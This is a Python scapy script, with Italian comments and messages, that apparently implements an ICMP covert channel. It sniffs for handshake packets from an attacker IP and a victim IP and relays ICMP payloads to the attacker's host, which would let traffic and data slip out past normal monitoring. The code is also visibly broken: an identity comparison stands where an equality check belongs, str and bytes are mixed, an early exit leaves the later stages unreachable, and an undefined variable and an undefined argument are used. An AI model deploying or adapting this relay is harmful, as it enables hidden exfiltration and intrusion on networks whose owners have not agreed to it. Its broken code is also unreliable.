from scapy.all import *
import threading 
import argparse 
import mymethods

parser = argparse.ArgumentParser()
parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")

event = threading.Event()
ip_attaccante=None
ip_vittima=None
id_redirect=None

def callback_redirect(packet):
    if packet[IP].src is not ip_attaccante:
        print(f"Il pacchetto non è stato mandato dall'attaccante ma da {packet[IP].src}")
        return
    print(f"Reindirizzamento del pacchetto {packet}") 
    payload=""
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
    print(payload) 
    if "__END__" in payload:
        payload=payload.replace("__END__","").strip()
        if payload=="":
            print("Fine connessione")
            event.set()
            return 
    if not packet[ICMP].id==mymethods.calculate(payload):
        print("Il payload non combacia con il checksum")
        print(packet.summary())
        return
    pkt = IP(dst=ip_attaccante)/ICMP(id=packet[ICMP].id, seq=packet[ICMP].seq) / payload
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_attaccante} is alive")
        #ans.show() 
    else:
        print(f"No reply: {ip_attaccante} is not responding") 

def parte_redirect_packet():
    sniffer= AsyncSniffer(
        filter=f"icmp and src host {ip_attaccante}" 
        #,count=1 
        ,prn=callback_redirect 
        # #,store=True 
        # #,iface=args.host_iface 
    ) 
    sniffer.start()
    event.wait()
    sniffer.join()
    sniffer.stop()

def callback_vittima(packet):
    print("Packet received: {}".format(packet.summary()))
    global ip_vittima
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = mymethods.calculate(bytes(packet[Raw].load))
        check_sum=mymethods.calculate(b"__CONNECT__ ")
        if check_sum==payload and ip_vittima==packet[IP].src and packet[ICMP].id==check_sum:
            print("Payload: {}".format(payload)) 
            print("Vittima IPs: {}".format(ip_vittima))
            event.set()
        else:
            print(f"Il paccheto proviene da {packet[IP].src} ma non è valido")
            raise Exception(f"Il paccheto proviene da {packet[IP].src} ma non è valido")    

def parte_vittima(): 
    payload=mymethods.calculate(b"__CONNECT__ ")
    pkt = IP(dst=ip_vittima)/ICMP(id=mymethods.calculate(b"__CONNECT__ ")) / payload
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_vittima} is alive")
        #ans.show() 
    else:
        print(f"No reply: {ip_vittima} is not responding") 
        raise Exception("La vittima non risponde")
    sniffer= AsyncSniffer(
        filter=f"icmp and src host {ip_vittima}" 
        #,count=1 
        ,prn=callback_vittima 
        #,store=True 
        #,iface=args.host_iface 
    ) 
    sniffer.start()
    event.wait()
    sniffer.join()
    sniffer.stop()

def callback_attaccante(packet):
    print("Packet received: {}".format(packet.summary()))
    global ip_vittima
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
        if b'__CONNECT__' in payload and ip_attaccante==packet[IP].src:
            print("Found __CONNECT__")
            ip_vittima= payload.decode().replace('__CONNECT__',"").strip()
            print("Attacker IP: {}".format(ip_attaccante))
            #print("Payload: {}".format(payload)) 
            print("Vittima IPs: {}".format(ip_vittima))
            event.set()
        else:
            print(f"Il paccheto proviene da {packet[IP].src} ma non richiede la connessione alla macchina")

def connessione_attaccante():
    print(f"Controllo connessione con l'attaccante: {ip_attaccante}")
    sniffer= AsyncSniffer(
            filter=f"icmp and src {ip_attaccante}" 
            #,count=1 
            ,prn=callback_attaccante 
            #,store=True 
            ,iface=args.host_iface 
    ) 
    sniffer.start()
    print("AAA")
    event.wait()
    sniffer.join()
    sniffer.stop()
    pkt = IP(dst=ip_attaccante)/ICMP() / mymethods.calculate(b"__CONNECT__ ")
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_attaccante} is alive")
        #ans.show()
    else:
        print(f"No reply: {ip_attaccante} is not responding")
        raise Exception("Nessuna risposta dall'attaccante") 

if __name__ == "__main__": 
    print("Main function") 
    args=mymethods.check_args(parser) 
    if args.ip_attaccante is None :
        print("Devi specificare l'IP dell'attaccante")
        mymethods.supported_arguments(parser)
        exit(0) 
    global sniffer
    ip_attaccante=args.ip_attaccante 
    try:
        connessione_attaccante()
        exit(0)
    except Exception as e:
        print(f"Eccezione: {e}")
        exit(1)
    try:
        parte_vittima()
    except Exception as e:
        print(f"Eccezzione: {f}")
    try:
        parte_redirect_packet() 
        #thread = threading.Thread(target=sniff_4_start)
        #thread.start() 
    except Exception as e:
        print(f"Eccezzione: {f}")